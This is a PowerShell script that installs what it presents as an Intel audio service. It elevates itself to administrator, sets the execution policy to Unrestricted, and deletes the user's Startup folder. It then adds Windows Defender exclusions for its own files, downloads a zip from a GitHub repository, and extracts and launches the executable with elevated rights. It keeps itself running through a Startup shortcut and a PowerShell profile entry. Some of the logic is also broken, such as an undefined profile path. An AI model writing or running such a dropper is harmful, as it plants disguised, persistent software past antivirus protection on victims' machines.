if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
      if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
            $CommandLine = $MyInvocation.MyCommand.Path
            Start-Process powershell -Verb runas -ArgumentList $CommandLine
            Exit
      }
}

#Elevated script content after that
$WScriptShell = New-Object -ComObject WScript.Shell
$FolderPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
$ShortcutFile = "$FolderPath\intelaudio.lnk"
$TargetPath = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\intelaudio"
$TargetFile = "$TargetPath\intelaudio.exe"
$TargetZip = "$TargetPath\intelaudio.zip"


Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
Get-ExecutionPolicy -List

if (Test-Path -Path "$FolderPath" -ErrorAction SilentlyContinue) {
      Remove-Item -Path "$FolderPath" -Recurse -Force
      Write-Output "Startup folder removed"
}

if (Test-Path -Path "$TargetPath" -ErrorAction SilentlyContinue) {
      Remove-Item -Path "$TargetPath" -Recurse -Force
      Write-Output "Target folder removed"
}

if (-Not (Test-Path "$FolderPath")) {
      New-Item -ItemType Directory -Force -Path "$FolderPath"
      Write-Output "Startup folder created"
}

if (-Not (Test-Path "$TargetPath")) {
      New-Item -ItemType Directory -Force -Path "$TargetPath"
      Write-Output "Target folder created"
}

Add-MpPreference -ExclusionProcess 'intelaudio'
Add-MpPreference -ExclusionProcess 'intelaudio.exe'
Add-MpPreference -ExclusionPath "$FolderPath"
Add-MpPreference -ExclusionPath "$TargetPath"
Add-MpPreference -ExclusionPath "$TargetFile"
Write-Output "Exclusions added"


if (-Not (Test-Path "$TargetFile")) {
      Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudioservice/raw/refs/heads/main/x64/Debug/intelaudio.zip" -OutFile "$TargetZip"
      Write-Output "File downloaded"
      Expand-Archive -Path "$TargetZip" -DestinationPath "$TargetPath"
      Write-Output "File extracted"
      Remove-Item -Path "$TargetZip"
      Write-Output "Zip file removed"
}

if (-Not (Test-Path "$TargetFile")) {
      $Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
      $Shortcut.TargetPath = "$TargetFile"
      $Shortcut.WorkingDirectory = "$TargetPath"
      $Shortcut.IconLocation = "$TargetPath\intelaudio.exe,0"
      $Shortcut.Save()
      Write-Output "Shortcut created"
}

if (Select-String -Path "$PowershellFile" "Start-Process") {
      Write-Output "Powershell profile already updated"
} else {
      Set-Content -Path "$PowershellFile" -Value "if (Get-Process -Name 'intelaudio' -ErrorAction SilentlyContinue) { exit } else { Start-Process -FilePath '$TargetFile' -Verb RunAs; exit }"
      Write-Output "Powershell profile updated"
}

if (Get-Process -Name 'intelaudio' -ErrorAction SilentlyContinue) {
      exit
} else {
      Start-Process -FilePath "$TargetFile" -Verb RunAs
      exit
}
